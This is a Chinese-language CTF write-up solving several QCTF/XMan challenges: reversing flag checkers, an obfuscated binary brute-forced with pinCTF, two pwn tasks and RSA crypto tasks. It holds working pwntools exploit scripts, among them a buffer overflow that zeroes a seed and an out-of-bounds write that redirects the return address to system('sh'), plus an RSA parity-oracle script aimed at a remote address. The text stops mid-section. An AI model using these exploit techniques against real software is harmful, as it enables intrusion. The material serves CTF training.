Meta-Information ---------------------// Detected compiler/packer: gcc (7.3.0)// Detected functions: 1// Decompilation date: 2019-01-23 16:29:58 main 中先输入字符串，然后将字符串中的每个字符依次与32-i异或，前五位与Q|j{g比较，之后将字符串作为参数调用上一个 check 函数。 由于之前的奇偶难以判断，所以采用爆破的方式。用 python 写出爆破脚本： 123456789101112131415161718192021#!/usr/bin/env pythonenc1 = 'Q|j&#123;g'enc2 = '\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f'flag = ''for i in range(5): ch = ord(enc1[i]) ^ (32 - i) print 'index', i, '==&gt;', chr(ch) flag += chr(ch)for i in range(5, 32): for ch in range(256): t = ch ^ (32 - i) if i % 2 == 0: res = ((t &lt;&lt; 2) &amp; 0xff) | (t &gt;&gt; 6) else: res = (t &gt;&gt; 2) | ((t &lt;&lt; 6) &amp; 0xff) if res == ord(enc2[i - 5]): print 'index', i, '==&gt;', chr(ch) flag += chr(ch) breakprint len(flag)print 'flag:', flag 最后放上官方给出的源码： 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;string.h&gt;char *check1=\"Q|j&#123;g\";char *check2= \"\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f\";void check(char *s)&#123; int i; for(i=5;i&lt;strlen(s);i++)&#123; if(i%2) s[i]=(s[i]&gt;&gt;2)|((s[i]&lt;&lt;6)&amp;0xff); else s[i]=((s[i]&lt;&lt;2)&amp;0xff)|(s[i]&gt;&gt;6); &#125; if(!strncmp(&amp;s[5],check2,27)) printf(\"Right!\\n\"); else printf(\"Wrong!\\n\");&#125;void main()&#123; char s[33]; int i; printf(\"Give me your flag:\"); scanf(\"%32s\",s); for(i=0;i&lt;32;i++) s[i]^=(32-i); if(!strncmp(s,check1,5)) check(s); else printf(\"Wrong\\n\");&#125; asong总共给了三个文件，asong为可执行文件，that_girl以及out都是 ascii 文本。将asong拖进 ida 后，看到 main 函数的样子： 1234567891011121314__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; void *girl; // ST00_8 char *input; // ST08_8 girl = malloc(0xBCuLL); input = (char *)malloc(0x50uLL); init_func(); getline(input); simple_check(input); cal(\"that_girl\", (__int64)girl); encrypt(input, (__int64)girl); return 0LL;&#125; 第一个init_func()，设置一下缓冲区： 123456void init_func()&#123; setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL);&#125; getline()函数实现了一个简单的读取一行的功能： 12345678910111213141516171819char __fastcall getline(char *a1)&#123; char *v1; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) &#123; LOBYTE(v1) = read(0, &amp;a1[i], 1uLL) == 1; if ( !(_BYTE)v1 ) break; if ( a1[i] == 10 || i &gt; 100 ) &#123; v1 = &amp;a1[i]; *v1 = 0; return (char)v1; &#125; &#125; return (char)v1;&#125; simple_check()函数检查读入字符串中是否以&#39;QCTF{&#39;开头，以及是否以&#39;}&#39;结尾： 123456789101112131415void __fastcall simple_check(char *a1)&#123; int v1; // [rsp+14h] [rbp-Ch] void *dest; // [rsp+18h] [rbp-8h] dest = malloc(0x50uLL); if ( memcmp(a1, \"QCTF&#123;\", 5uLL) ) exit(-1); memcpy(dest, a1 + 5, 0x4BuLL); v1 = strlen((const char *)dest); if ( *((_BYTE *)dest + v1 - 1) == '&#125;' ) *((_BYTE *)dest + v1 - 1) = 0; memcpy(a1, dest, 0x50uLL); free(dest);&#125; cal()函数读取了文件that_girl的内容，应该是通过convert()函数对其中的每个字符做了一个词频的统计： 1234567891011121314151617int __fastcall cal(const char *that_girl, __int64 girl)&#123; int v2; // eax char *v4; // [rsp+0h] [rbp-20h] char buf; // [rsp+13h] [rbp-Dh] int fd; // [rsp+14h] [rbp-Ch] unsigned __int64 v7; // [rsp+18h] [rbp-8h] v7 = __readfsqword(0x28u); fd = open(that_girl, 0, girl, that_girl); while ( read(fd, &amp;buf, 1uLL) == 1 ) &#123; v2 = convert(buf); ++*(_DWORD *)&amp;v4[4 * v2]; &#125; return close(fd);&#125; convert()函数中是一个对读入的 buf 的映射，不用刻意看具体是什么操作，后面直接打表就完事了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455__int64 __fastcall convert(char buf)&#123; __int64 result; // rax result = (unsigned int)(buf - 10); switch ( buf ) &#123; case '\\n': result = (unsigned int)(buf + 35); break; case ' ': case '!': case '\"': result = (unsigned int)(buf + 10); break; case '\\'': result = (unsigned int)(buf + 2); break; case ',': result = (unsigned int)(buf - 4); break; case '.': result = (unsigned int)(buf - 7); break; case ':': case ';': result = (unsigned int)(buf - 21); break; case '?': result = (unsigned int)(buf - 27); break; case '_': result = (unsigned int)(buf - 49); break; default: if ( buf &lt;= '/' || buf &gt; '9' ) &#123; if ( buf &lt;= '@' || buf &gt; 'Z' ) &#123; if ( buf &gt; '`' &amp;&amp; buf &lt;= 'z' ) result = (unsigned int)(buf - 87); // lower case &#125; else &#123; result = (unsigned int)(buf - 55); // upper case &#125; &#125; else &#123; result = (unsigned int)(buf - 48); // number &#125; break; &#125; return result;&#125; 最后是对 flag 的加密部分： 12345678910111213141516unsigned __int64 __fastcall encrypt(const char *input, char *girl)&#123; int i; // [rsp+18h] [rbp-48h] int len; // [rsp+1Ch] [rbp-44h] char enc[56]; // [rsp+20h] [rbp-40h] unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); len = strlen(input); for ( i = 0; i &lt; len; ++i ) enc[i] = *(_DWORD *)&amp;girl[4 * (signed int)convert(input[i])]; index_round(enc); shift(enc, len); output(enc, \"out\", len); return __readfsqword(0x28u) ^ v6;&#125; 这里用到了一个 global 的 table，和之前的词频一样，通过打表将映射关系记录下来： 12345678910111213141516__int64 __fastcall index_round(char *enc)&#123; __int64 result; // rax _BYTE v2[5]; // [rsp+13h] [rbp-5h] v2[4] = 0; // v2[1] = 0; *(_DWORD *)v2 = (unsigned __int8)*enc; while ( table[*(signed int *)&amp;v2[1]] ) &#123; enc[*(signed int *)&amp;v2[1]] = enc[table[*(signed int *)&amp;v2[1]]]; *(_DWORD *)&amp;v2[1] = table[*(signed int *)&amp;v2[1]]; &#125; result = v2[0]; enc[*(signed int *)&amp;v2[1]] = v2[0]; return result;&#125; shift()做了一个循环位移，这个操作显然是可逆的： 12345678910111213char *__fastcall shift(char *enc, int len)&#123; char *result; // rax char v3; // [rsp+17h] [rbp-5h] int i; // [rsp+18h] [rbp-4h] v3 = (unsigned __int8)*enc &gt;&gt; 5; for ( i = 0; len - 1 &gt; i; ++i ) enc[i] = 8 * enc[i] | ((unsigned __int8)enc[i + 1] &gt;&gt; 5); result = &amp;enc[i]; *result = 8 * *result | v3; return result;&#125; output()函数将密文输出到out中： 123456789101112int __fastcall output(char *enc, const char *file, int len)&#123; int v4; // [rsp+Ch] [rbp-24h] int i; // [rsp+28h] [rbp-8h] int fd; // [rsp+2Ch] [rbp-4h] v4 = len; fd = open(file, 65, 438LL); for ( i = 0; i &lt; v4; ++i ) write(fd, &amp;enc[i], 1uLL); return close(fd);&#125; 总体加密过程统计了 that_girl 文件的词频, 并将 flag 转换为对应的词频。经过两次加密, 置换, 移位。最后在尝试中写出最后的脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/env pythonf = open('out', 'rb')t = f.read()f.close()enc = []for i in range(len(t)): enc.append(ord(t[i]))print encflag = ''def convert(c): res = c - 10 if c == 10: res = c + 35 elif 32 &lt;= c &lt;= 34: res = c + 10 elif c == 39: res = c + 2 elif c == 44: res = c - 4 elif c == 46: res = c - 7 elif 58 &lt;= c &lt;= 59: res = c - 21 elif c == 63: res = c - 27 elif c == 95: res = c - 49 else: if c &lt;= 47 or c &gt; 57: if c &lt;= 64 or c &gt; 90: if c &gt; 96 and c &lt;= 122: res = c - 87 else: res = c - 55 else: res = c - 48 return res# convert1convert_map = &#123;&#125;for ch in range(256): convert_map[convert(ch)] = ch# print convert_mapf = open('that_girl', 'rb')that_girl = f.read()f.close()# print that_girlgirl = [0 for i in range(256)]for i in range(len(that_girl)): t = convert(that_girl[i]) girl[t * 4] += 1# print girl# shiftenc1 = []enc1.append(((enc[-1] &lt;&lt; 5) &amp; 0xff) | (enc[0] &gt;&gt; 3))for i in range(len(enc) - 1): enc1.append(((enc[i] &lt;&lt; 5) &amp; 0xff) | (enc[i + 1] &gt;&gt; 3))print len(enc1)table = [0x00000016, 0x00000000, 0x00000006, 0x00000002, 0x0000001E, 0x00000018, 0x00000009, 0x00000001, 0x00000015, 0x00000007, 0x00000012, 0x0000000A, 0x00000008, 0x0000000C, 0x00000011, 0x00000017, 0x0000000D, 0x00000004, 0x00000003, 0x0000000E, 0x00000013, 0x0000000B, 0x00000014, 0x00000010, 0x0000000F, 0x00000005, 0x00000019, 0x00000024, 0x0000001B, 0x0000001C, 0x0000001D, 0x00000025, 0x0000001F, 0x00000020, 0x00000021, 0x0000001A, 0x00000022, 0x00000023]print len(table)# convert2round_map = &#123;&#125;x = 0while table[x] != 0: round_map[table[x]] = x x = table[x]round_map[0] = 1print round_mapenc2 = [0 for i in range(len(enc1))]for origin, encoded in round_map.items(): enc2[origin] = enc1[encoded]for i in range(len(enc2)): for j in range(len(girl) / 4): if enc2[i] == girl[j * 4]: flag += chr(convert_map[j]) breakprint 'flag: QCTF&#123;%s&#125;' % flag ollvm题目给的 binary 很大，各种混淆，硬逆太困难了。pintool走一波，这里推荐一个脚本pinCTF（大概跑了一个半小时的样子）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182root@fea7928d5398:~/PinCTF# ./pinCTF.py -f ./ollvm -a -l obj-intel64/ -sl 38 -r abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_+=&#123;&#125; -sk[~] Status:threading : FalsereverseRange : FalseskipFavoredPaths : True[~] Trying &#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 0 using Q for QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying Q&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 1 using C for QCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QC&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 2 using T for QCTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCT&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 3 using F for QCTFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 4 using &#123; for QCTF&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 5 using 5 for QCTF&#123;5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 6 using Y for QCTF&#123;5YAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Y&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 7 using m for QCTF&#123;5YmAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 8 using 4 for QCTF&#123;5Ym4AAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 9 using a for QCTF&#123;5Ym4aAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4a&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 10 using O for QCTF&#123;5Ym4aOAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aO&#123;AAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 11 using E for QCTF&#123;5Ym4aOEAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOE&#123;AAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 12 using w for QCTF&#123;5Ym4aOEwAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEw&#123;AAAAAAAAAAAAAAAAAAAAAAAA[+] iter 13 using w for QCTF&#123;5Ym4aOEwwAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww&#123;AAAAAAAAAAAAAAAAAAAAAAA[+] iter 14 using 2 for QCTF&#123;5Ym4aOEww2AAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2&#123;AAAAAAAAAAAAAAAAAAAAAA[+] iter 15 using N for QCTF&#123;5Ym4aOEww2NAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2N&#123;AAAAAAAAAAAAAAAAAAAAA[+] iter 16 using c for QCTF&#123;5Ym4aOEww2NcAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2Nc&#123;AAAAAAAAAAAAAAAAAAAA[+] iter 17 using Z for QCTF&#123;5Ym4aOEww2NcZAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZ&#123;AAAAAAAAAAAAAAAAAAA[+] iter 18 using c for QCTF&#123;5Ym4aOEww2NcZcAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZc&#123;AAAAAAAAAAAAAAAAAA[+] iter 19 using v for QCTF&#123;5Ym4aOEww2NcZcvAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcv&#123;AAAAAAAAAAAAAAAAA[+] iter 20 using U for QCTF&#123;5Ym4aOEww2NcZcvUAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvU&#123;AAAAAAAAAAAAAAAA[+] iter 21 using P for QCTF&#123;5Ym4aOEww2NcZcvUPAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUP&#123;AAAAAAAAAAAAAAA[+] iter 22 using O for QCTF&#123;5Ym4aOEww2NcZcvUPOAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPO&#123;AAAAAAAAAAAAAA[+] iter 23 using W for QCTF&#123;5Ym4aOEww2NcZcvUPOWAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOW&#123;AAAAAAAAAAAAA[+] iter 24 using K for QCTF&#123;5Ym4aOEww2NcZcvUPOWKAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWK&#123;AAAAAAAAAAAA[+] iter 25 using Y for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKY&#123;AAAAAAAAAAA[+] iter 26 using M for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYM&#123;AAAAAAAAAA[+] iter 27 using n for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMn&#123;AAAAAAAAA[+] iter 28 using P for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnP&#123;AAAAAAAA[+] iter 29 using a for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPa&#123;AAAAAAA[+] iter 30 using q for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaq&#123;AAAAAA[+] iter 31 using P for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqP&#123;AAAAA[+] iter 32 using y for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPyAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPy&#123;AAAA[+] iter 33 using w for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPyw&#123;AAA[+] iter 34 using R for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywRAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR&#123;AA[+] iter 35 using 2 for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2AA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2&#123;A[+] iter 36 using m for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2mA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2m&#123;[+] iter 37 using &#125; for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2m&#125;[+] Found pattern QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2m&#125; PWNXman-dice_game放进 ida 看 main 函数： buf 存在溢出，可以覆盖到 seed，使之为 0。想法就是通过爆破得到随机数的顺序。脚本： 1234567891011121314151617181920212223242526272829303132333435from pwn import *import randomimport timedef test(ans): p = process('./dice_game') # p = remote(\"47.96.239.28\", 9999) p.readuntil(\"name:\") payload = p64(0xabcdabcdabcdabcd) * 8 + p64(0) p.sendline(payload) i = 0 ans_len = len(ans) log.success(ans) if True: while i &lt; ans_len: p.readuntil(\"nt(1~6): \") n = ans[i] i += 1 p.sendline(n) random.seed(time.time()) n = str(int(random.randint(1, 6))) p.readuntil(\"nt(1~6): \") p.sendline(n) print(n) sub = p.readuntil('.') log.info(sub) return sub, nans = \"\"while(1): if len(ans) == 50: print(ans) break res, n = test(ans) if \"win\" in res: ans += n 通过得到的顺序作为 payload，脚本： 1234567891011121314from pwn import *p = process('./dice_game')# p = remote(\"47.96.239.28\", 9999)p.readuntil(\"name:\")payload = p64(0x1122334455667788) * 8 + p64(0)p.sendline(payload)ans = \"25426251423232651155634433322261116425254446323361\"i = 0while i &lt; 50: p.readuntil(\"nt(1~6): \") n = ans[i] i += 1 p.sendline(n)p.interactive() Xan-stack2感觉这应该算是一道比较好的栈溢出的题。checksec发现 PIE 没开，Canary 和 NX 都开了。 拖进 ida 后 f5： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax unsigned int v5; // [esp+18h] [ebp-90h] unsigned int v6; // [esp+1Ch] [ebp-8Ch] int v7; // [esp+20h] [ebp-88h] unsigned int j; // [esp+24h] [ebp-84h] int v9; // [esp+28h] [ebp-80h] unsigned int i; // [esp+2Ch] [ebp-7Ch] unsigned int k; // [esp+30h] [ebp-78h] unsigned int l; // [esp+34h] [ebp-74h] char v13[100]; // [esp+38h] [ebp-70h] unsigned int v14; // [esp+9Ch] [ebp-Ch] v14 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); v9 = 0; puts(\"***********************************************************\"); puts(\"* An easy calc *\"); puts(\"*Give me your numbers and I will return to you an average *\"); puts(\"*(0 &lt;= x &lt; 256) *\"); puts(\"***********************************************************\"); puts(\"How many numbers you have:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"Give me your numbers\"); for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i ) &#123; __isoc99_scanf(\"%d\", &amp;v7); v13[i] = v7; &#125; for ( j = v5; ; printf(\"average is %.2lf\\n\", (double)((long double)v9 / (double)j)) ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); __isoc99_scanf(\"%d\", &amp;v6); if ( v6 != 2 ) break; puts(\"Give me your number\"); __isoc99_scanf(\"%d\", &amp;v7); if ( j &lt;= 0x63 ) &#123; v3 = j++; v13[v3] = v7; &#125; &#125; if ( v6 &gt; 2 ) break; if ( v6 != 1 ) return 0; puts(\"id\\t\\tnumber\"); for ( k = 0; k &lt; j; ++k ) printf(\"%d\\t\\t%d\\n\", k, v13[k]); &#125; if ( v6 != 3 ) break; puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; &#125; if ( v6 != 4 ) break; v9 = 0; for ( l = 0; l &lt; j; ++l ) v9 += v13[l]; &#125; return 0;&#125; 还能看到有一个hackhere函数，直接调用了system(&quot;/bin/bash&quot;)。 12345puts(\"which number to change:\");__isoc99_scanf(\"%d\", &amp;v5);puts(\"new number:\");__isoc99_scanf(\"%d\", &amp;v7);v13[v5] = v7; // index out of bound \b 这里发现 v5 和 v7 没有做任何检查，能达到任意地址写。 所以这题的思路就是将main函数 return 地址覆盖为hackhere的地址。 基本就是 ret 到 hackhere 然后直接就成功了： 12345678910111213141516171819202122232425#!/usr/bin/env pythonfrom pwn import *import ctypesp = process('./stack2')context.log_level = 'debug'def change(index, content): p.sendlineafter('5. exit\\n', '3') p.sendlineafter('which number to change:\\n', str(index)) p.sendlineafter('new number:\\n', str(content))p.sendlineafter('How many numbers you have:\\n', '1')p.sendlineafter('Give me your numbers\\n', '1')hack_addr = 0x0804859boffset = 132# gdb.attach(p, 'b *0x0804859b')for i in range(4): byte = (hack_addr &gt;&gt; (i * 8)) &amp; 0xff byte = str(ctypes.c_int8(byte)) start = byte.find('(') + 1 end = byte.find(')') byte = int(byte[start:end]) change(offset + i, byte)p.sendlineafter('5. exit\\n', '5')p.interactive() 但发现远程没有 bash，所以想到直接用字符串中的 sh，即system(&amp;&quot;/bin/bash&quot;[7])，只需要找到字符串在栈上的位置： 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env pythonfrom pwn import *import ctypesp = process('./stack2')context.log_level = 'debug'def change(index, content): p.sendlineafter('5. exit\\n', '3') p.sendlineafter('which number to change:\\n', str(index)) p.sendlineafter('new number:\\n', str(content))p.sendlineafter('How many numbers you have:\\n', '1')p.sendlineafter('Give me your numbers\\n', '1')hack_addr = 0x0804859bsys_addr = 0x08048450offset = 132# gdb.attach(p, 'b *0x0804859b')# overflow retfor i in range(4): byte = (sys_addr &gt;&gt; (i * 8)) &amp; 0xff byte = str(ctypes.c_int8(byte)) start = byte.find('(') + 1 end = byte.find(')') byte = int(byte[start:end]) change(offset + i, byte)str_addr = 0x08048987offset2 = offset + 8# point to string 'sh'for i in range(4): byte = (str_addr &gt;&gt; (i * 8)) &amp; 0xff byte = str(ctypes.c_int8(byte)) start = byte.find('(') + 1 end = byte.find(')') byte = int(byte[start:end]) change(offset2 + i, byte)p.sendlineafter('5. exit\\n', '5')p.interactive() CryptobabyRSA题目信息如下： 12345e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0 最低有效位攻击了解一下。 对密文乘2^e(mod n)操作，再解密的时候，如果为偶数，说明明文在(0, n/2)之间，否则在(n/2, n)之间。这样，只需要 log2n 次就可以知道明文： 12345678910111213141516171819202122232425262728293031323334#!/usr/bin/env pythonfrom pwn import *e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0upper = nlower = 0k = 1while True: r = remote('111.198.29.45', 33136) r.recvuntil('now\\n') pat = (pow(pow(2, k, n), e, n) * c) % n new_c = hex(pat)[2:].strip('L') r.sendline(new_c) data = r.recvline()[:-1] r.close() gap = upper - lower if data == 'even': info('Round &#123;&#125;: even'.format(str(k))) upper = (upper + lower) / 2 if data == 'odd': info('Round &#123;&#125;: odd'.format(str(k))) lower = (upper + lower) / 2 if data == 'error': break if gap &lt; 2: break info(gap) k += 1flag = '&#123;:x&#125;'.format(upper).decode('hex')[:-1] + '&#125;'print 'flag:', flag Xman-RSA拿到四个文件后，其中有一个很像 python 的脚本，通过对关键字等的判断，自己写脚本还原： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546l1 = &#123; 'a': 'd', 'b': 'm', 'd': 'e', 'e': 'n', 'f': 'w', 'g': 'f', 'h': 'o', 'i': 'x', 'j': 'g', 'k': 'p', 'l': 'y', 'm': 'h', 'p': 'i', 'q': 'r', 'r': 'a', 't': 's', 'u': 'b', 'v': 'k', 'w': 't', 'x': 'c', 'y': 'l', 'z': 'u'&#125;f = open('encryption.encrypted', 'r')ans = f.read()# print ansres = \"\"for ch in ans: flag = 0 for key, value in l1.items(): if ch == key: res += value flag = 1 break else: continue if flag == 1: continue else: res += chprint resraw_input()f = open('1.py', 'wb')f.write(res)f.close() 还原出原来的加密脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from gmpy2 import is_primefrom os import urandomimport base64def bytes_to_num(b): return int(b.encode('hex'), 16)def num_to_bytes(n): b = hex(n)[2:-1] b = '0' + b if len(b)%2 == 1 else b return b.decode('hex')def get_a_prime(l): random_seed = urandom(l) num = bytes_to_num(random_seed) while True: if is_prime(num): break num+=1 return numdef encrypt(s, e, n): p = bytes_to_num(s) p = pow(p, e, n) return num_to_bytes(p).encode('hex')def separate(n): p = n % 4 t = (p*p) % 4 return t == 1f = open('flag.txt', 'r')flag = f.read()msg1 = \"\"msg2 = \"\"for i in range(len(flag)): if separate(i): # 奇数 msg2 += flag[i] else: # 偶数 msg1 += flag[i]p1 = get_a_prime(128)p2 = get_a_prime(128)p3 = get_a_prime(128)n1 = p1*p2n2 = p1*p3e = 0x1001c1 = encrypt(msg1, e, n1)c2 = encrypt(msg2, e, n2)print(c1)print(c2)e1 = 0x1001e2 = 0x101p4 = get_a_prime(128)p5 = get_a_prime(128)n3 = p4*p5c1 = num_to_bytes(pow(n1, e1, n3)).encode('hex')c2 = num_to_bytes(pow(n1, e2, n3)).encode('hex')print(c1)print(c2)print(base64.b64encode(num_to_bytes(n2)))print(base64.b64encode(num_to_bytes(n3))) 代码看完后，思路是先用共模攻击解出n1，之后利用公约数得到p1、p2、p3，再求出d1、d2，最后解出msg1、msg2。给出的文件中，ciphertext为第二次输出的c1和c2，，n1.encrypted为第二次输出的c1和c2，n2&amp;n3即最后输出的被加密后的n2和n3。解密脚本如下： 